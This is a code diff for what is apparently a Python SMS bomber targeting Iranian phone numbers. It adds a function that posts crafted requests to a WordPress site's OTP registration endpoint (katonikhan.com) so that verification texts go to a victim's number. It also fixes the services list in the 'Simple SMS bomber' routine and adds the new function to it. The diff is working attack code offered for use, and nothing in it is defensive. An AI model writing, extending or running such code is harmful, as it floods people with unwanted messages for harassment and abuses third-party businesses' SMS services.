@@ -98,6 +98,52 @@ def ragham_call(phone):
         return False
 
 
+def katonikhan(phone):
+    import requests
+    digits_phone = phone.replace("+98", "")
+    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
+    try:
+        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
+        payload = {
+            "phone": formatted_phone,
+            "digt_countrycode": "+98",
+            "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "instance_id": "f2cf6e724788dcfaacd48173e7215663",
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "otp",
+            "digits": "1",
+            "digits_redirect_page": "-1",
+            "aio_special_field": "",
+            "digits_form": "92e2d882a6",
+            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://katonikhan.com",
+            "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
+        }
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+        if response.status_code == 200:
+            try:
+                response_data = response.json()
+                if response_data.get("success") is True:
+                    print(f'{g}(katonikhan) {a}Code Sent')
+                    return True
+            except:
+                pass
+        return False
+    except Exception:
+        return False
+
 def katoonistore(phone):
     import requests
     import re
@@ -496,14 +542,14 @@ def send_service_safe(service, phone):
 # Simple SMS bomber
 def Vip(phone, Time):
     services = [
-    snap, gap, divar, alibaba, mek, okorosh,
-    drnext, pindo, shahrfarsh, tetherland, snapp_market,
-    trip_call, paklean_call, ragham_call,  digikala, barghman,
-    achareh, snappshop, bimebazar, ilozi, komodaa, alopeyk_safir
-        hajamooo,
-        katoonistore,
+        snap, gap, divar, alibaba, mek, okorosh,
+        drnext, pindo, shahrfarsh, tetherland, snapp_market,
+        trip_call, paklean_call, ragham_call, digikala, barghman,
+        achareh, snappshop, bimebazar, ilozi, komodaa, alopeyk_safir,
+        hajamooo, katoonistore, katonikhan,
+    ]
 
-]
+    
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
